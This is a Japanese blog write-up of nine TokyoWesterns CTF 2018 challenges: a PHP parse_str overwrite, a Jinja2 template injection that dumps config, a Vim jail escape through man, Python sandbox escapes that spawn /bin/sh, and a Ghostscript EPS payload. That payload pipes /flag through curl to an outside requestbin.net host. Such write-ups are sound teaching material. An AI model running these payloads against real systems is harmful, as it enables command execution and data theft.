---
layout: post
title: TokyoWesterns CTF 4th 2018 の write-up
categories: [ctf]
date: 2018-12-28 04:20:00 +0900
---

9 月 1 日から 9 月 3 日にかけて開催された[TokyoWesterns CTF 4th 2018](https://tokyowesterns.github.io/ctf2018/) にチーム Harekaze で参加しました。最終的にチームで 2241 点を獲得し、順位は得点 810 チーム中 10 位でした。うち、私は 9 問を解いて 1191 点を入れました。

以下、解いた問題の write-up です。

## [Web 55] SimpleAuth

> http://simpleauth.chal.ctf.westerns.tokyo

与えられた URL にアクセスすると以下のようなソースコードが表示されました。

```php
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'auth') {
    if (!empty($res['user'])) {
        $user = $res['user'];
    }
    if (!empty($res['pass'])) {
        $pass = $res['pass'];
    }

    if (!empty($user) && !empty($pass)) {
        $hashed_password = hash('md5', $user.$pass);
    }
    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
        echo $flag;
    }
    else {
        echo 'fail :(';
    }
}
else {
    highlight_file(__FILE__);
}
```

GET パラメータが `parse_str` で変数として展開されています。`$user` と `$pass` が空であれば `$hashed_password` には何も代入されないので、`/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e` にアクセスするとフラグが表示されました。

```
TWCTF{d0_n0t_use_parse_str_without_result_param}
```

## [Web 190] Shrine

> shrine は日本語で神社です。
> http://shrine.chal.ctf.westerns.tokyo/

```python
import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{% raw %}{{{% endraw %}% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

SSTI ができそうですが、`(` と `)` が消されており [Exploring SSTI in Flask/Jinja2, Part II](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html) のように関数を呼ぶことができなさそうです。`config` や環境変数などを読むことができないか試してみましょう。

このスコープから参照できる `request` から `__class__`、そのメソッドである `__init__` からグローバル名前空間である `__globals__` を参照し…といった手順で辿っていくと、`{% raw %}{{{% endraw %} request.__class__.__init__.__globals__['_run_wsgi_app'].__globals__['sys'].modules['app'].index.__globals__['app'].config }}` で以下のように `config` を得ることができました。

```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'TWCTF{pray_f0r_sacred_jinja2}'}>
```

```
TWCTF{pray_f0r_sacred_jinja2}
```

## [Misc 126] vimshell

> Can you escape from jail?
> http://vimshell.chal.ctf.westerns.tokyo/

与えられた URL にアクセスすると、以下のような内容で Vim の画面が表示されました。

```diff
diff --git a/src/normal.c b/src/normal.c
index 41c762332..0011afb77 100644
--- a/src/normal.c
+++ b/src/normal.c
@@ -274,7 +274,7 @@ static const struct nv_cmd
     {'7',      nv_ignore,      0,                      0},
     {'8',      nv_ignore,      0,                      0},
     {'9',      nv_ignore,      0,                      0},
-    {':',      nv_colon,       0,                      0},
+    // {':',   nv_colon,       0,                      0},
     {';',      nv_csearch,     0,                      FALSE},
     {'<',      nv_operator,    NV_RL,                  0},
     {'=',      nv_operator,    0,                      0},
@@ -297,7 +297,7 @@ static const struct nv_cmd
     {'N',      nv_next,        0,                      SEARCH_REV},
     {'O',      nv_open,        0,                      0},
     {'P',      nv_put,         0,                      0},
-    {'Q',      nv_exmode,      NV_NCW,                 0},
+    // {'Q',   nv_exmode,      NV_NCW,                 0},
     {'R',      nv_Replace,     0,                      FALSE},
     {'S',      nv_subst,       NV_KEEPREG,             0},
     {'T',      nv_csearch,     NV_NCH_ALW|NV_LANG,     BACKWARD},
@@ -318,7 +318,7 @@ static const struct nv_cmd
     {'d',      nv_operator,    0,                      0},
     {'e',      nv_wordcmd,     0,                      FALSE},
     {'f',      nv_csearch,     NV_NCH_ALW|NV_LANG,     FORWARD},
-    {'g',      nv_g_cmd,       NV_NCH_ALW,             FALSE},
+    // {'g',   nv_g_cmd,       NV_NCH_ALW,             FALSE},
     {'h',      nv_left,        NV_RL,                  0},
     {'i',      nv_edit,        NV_NCH,                 0},
     {'j',      nv_down,        0,                      FALSE},
```

このパッチによってコロンなどが使えなくなっています。これによって `:!cat hoge` のように OS コマンドを実行したりできなくしているのでしょう。

[src/normal.c](https://github.com/vim/vim/blob/5d24a2257e597fd752e33b2c1e9c19cf9114a517/src/normal.c) を眺めていると、`Shift-K` を押した際に現在選択されている単語について `man` が呼び出されることが分かりました ([L5646-L5693](https://github.com/vim/vim/blob/5d24a2257e597fd752e33b2c1e9c19cf9114a517/src/normal.c#L5646-L5693))。`man` 上であれば `!ls` のように入力することで OS コマンドを実行することができます。

最初の行の `diff` を選択し `Shift-K` を押すと、`diff` の `man` を開くことができました。`!cat /flag` を実行するとフラグを得ることができました。

```
TWCTF{the_man_with_the_vim}
```

## [Web 267] Slack emoji converter

与えられた URL にアクセスし、`/source` にアクセスすると以下のようにソースコードが得られました。

```python
from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
from PIL import Image
import tempfile
import os


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    os.unlink(fname)
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
```

一見脆弱性はなさそうですが、`img = Image.open(fname)` と PIL を使ってユーザによって与えられたファイルを開いています。ここから思い出されるのは [Ghostscript の -dSAFER オプションの脆弱性に関する注意喚起](https://www.jpcert.or.jp/at/2018/at180035.html)で紹介されている脆弱性です。

[1640 - ghostscript: multiple critical vulnerabilities, including remote command execution - project-zero - Monorail](https://bugs.chromium.org/p/project-zero/issues/detail?id=1640) にあるものをいじってアップロードしてみましょう。

```
%!PS-Adobe-3.0 EPSF-3.0
%%Creator: Harekaze
%%BoundingBox: 0 0 128 128
%%Pages: 1
%%EndComments
%%Page: 1 1

/Times-Roman findfont
14 scalefont
setfont

a0
currentpagedevice /HWResolution get 0 (foobar) put
{ grestore } stopped {} if
mark /OutputFile (%pipe%curl $(cat /flag).5f90ba6d6fd2b244cac4.d.requestbin.net) currentdevice putdeviceprops

showpage
```

アップロードすると `TWCTFwatch_0ut_gh0stscr1pt_everywhere.5f90ba6d6fd2b244cac4.d.requestbin.net` の名前解決がされたことを確認できました。

```
TWCTF{watch_0ut_gh0stscr1pt_everywhere}
```

## pysandbox
### [Misc 121] (FLAG 1)

以下のようなソースコードが与えられました。

```python
import sys
import ast


blacklist = [ast.Call, ast.Attribute]

def check(node):
    if isinstance(node, list):
        return all([check(n) for n in node])
    else:
        """
	expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
	     | IfExp(expr test, expr body, expr orelse)
	     | Dict(expr* keys, expr* values)
	     | Set(expr* elts)
	     | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
	     -- the grammar constrains where yield expressions can occur
	     | Yield(expr? value)
	     -- need sequences for compare to distinguish between
	     -- x < 4 < 3 and (x < 4) < 3
	     | Compare(expr left, cmpop* ops, expr* comparators)
	     | Call(expr func, expr* args, keyword* keywords,
			 expr? starargs, expr? kwargs)
	     | Repr(expr value)
	     | Num(object n) -- a number as a PyObject.
	     | Str(string s) -- need to specify raw, unicode, etc?
	     -- other literals? bools?

	     -- the following expression can appear in assignment context
	     | Attribute(expr value, identifier attr, expr_context ctx)
	     | Subscript(expr value, slice slice, expr_context ctx)
	     | Name(identifier id, expr_context ctx)
	     | List(expr* elts, expr_context ctx) 
	     | Tuple(expr* elts, expr_context ctx)

	      -- col_offset is the byte offset in the utf8 string the parser uses
	      attributes (int lineno, int col_offset)

        """

        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt'],
            'SetComp': ['elt'],
            'DictComp': ['key', 'value'],
            'GeneratorExp': ['elt'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node 
        }

        for k, v in attributes.items():
            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                if isinstance(v, bool):
                    return v
                return all([check(getattr(node, attr)) for attr in v])


if __name__ == '__main__':
    expr = sys.stdin.readline()
    body = ast.parse(expr).body
    if check(body):
        sys.stdout.write(repr(eval(expr)))
    else:
        sys.stdout.write("Invalid input")
    sys.stdout.flush()
```

ユーザから与えられたコードを解析して、関数呼び出しなど禁止されている動作がない場合にのみそのコードを実行するようです。

このチェックに穴がないか調べてみましょう。

リスト内包表記のチェックを見てみましょう。コメント部分の `ListComp(expr elt, comprehension* generators)` とコード部分の `'ListComp': ['elt'],` を比較すると、`elt` の部分はチェックされているものの、`generators` の部分はチェックされていないことがわかります。

`[x for x in (__import__,) if x('os').system('/bin/sh')]` を投げてみると、シェルを得ることができました。

```
$ nc pwn1.chal.ctf.westerns.tokyo 30001
[x for x in (__import__,) if x('os').system('/bin/sh')]
ls
flag
run.sh
sandbox.py
ls -la
total 32
drwxr-x---  2 root pysandbox 4096 Sep  2 18:10 .
drwxr-xr-x 15 root root      4096 Sep  2 17:03 ..
-rw-r-----  1 root pysandbox  220 Aug 31  2015 .bash_logout
-rw-r-----  1 root pysandbox 3771 Aug 31  2015 .bashrc
-rw-r-----  1 root pysandbox  655 May 16  2017 .profile
-rw-r-----  1 root pysandbox   50 Sep  2 04:38 flag
-rwxr-x---  1 root pysandbox   46 Sep  2 16:53 run.sh
-rw-r-----  1 root pysandbox 3024 Sep  2 18:08 sandbox.py
cat flag
TWCTF{go_to_next_challenge_running_on_port_30002}
```

```
TWCTF{go_to_next_challenge_running_on_port_30002}
```

### [Misc 126] (FLAG 2)

FLAG 1 に以下のような変更が加えられました。

```diff
--- app.py      2018-09-03 05:57:15.035099300 +0900
+++ "2\\app.py" 2018-09-03 07:11:00.021181700 +0900
@@ -1,46 +1,55 @@
 import sys
 import ast
+import hashlib


-blacklist = [ast.Call, ast.Attribute]
+def check_flag1():
+    sys.stdout.write('input sha512(flag1) >> ')
+    sys.stdout.flush()
+    s = sys.stdin.readline().strip()
+    flag = open('./flag', 'rb').read().strip()
+    if hashlib.sha512(flag).hexdigest() != s:
+        exit()
+    sys.stdout.write(open(__file__, 'rb').read().decode())
+    sys.stdout.flush()
@@ -52,10 +61,10 @@
             'IfExp': ['test', 'body', 'orelse'],
             'Dict': ['keys', 'values'],
             'Set': ['elts'],
-            'ListComp': ['elt'],
-            'SetComp': ['elt'],
-            'DictComp': ['key', 'value'],
-            'GeneratorExp': ['elt'],
+            'ListComp': ['elt', 'generators'],
+            'SetComp': ['elt', 'generators'],
+            'DictComp': ['key', 'value', 'generators'],
+            'GeneratorExp': ['elt', 'generators'],
             'Yield': ['value'],
             'Compare': ['left', 'comparators'],
             'Call': False, # call is not permitted
@@ -67,7 +76,8 @@
             'Name': True,
             'List': ['elts'],
             'Tuple': ['elts'],
-            'Expr': ['value'], # root node
+            'Expr': ['value'], # root node
+            'comprehension': ['target', 'iter', 'ifs'],
         }

         for k, v in attributes.items():
@@ -78,6 +88,7 @@


 if __name__ == '__main__':
+    check_flag1()
     expr = sys.stdin.readline()
     body = ast.parse(expr).body
     if check(body):
```

コメント部分の `Subscript(expr value, slice slice, expr_context ctx)` とコード部分の `'Subscript': ['value'],` を比較すると、`value` のみがチェックされていることが分かります。

`[][__import__('os').system('/bin/sh')]` を投げてみると、シェルを得ることができました。

```
$ nc pwn1.chal.ctf.westerns.tokyo 30002
[][__import__('os').system('/bin/sh')]
ls
flag
flag2
run.sh
sandbox2.py
cat flag2
TWCTF{baby_sandb0x_escape_with_pythons}
```

```
TWCTF{baby_sandb0x_escape_with_pythons}
```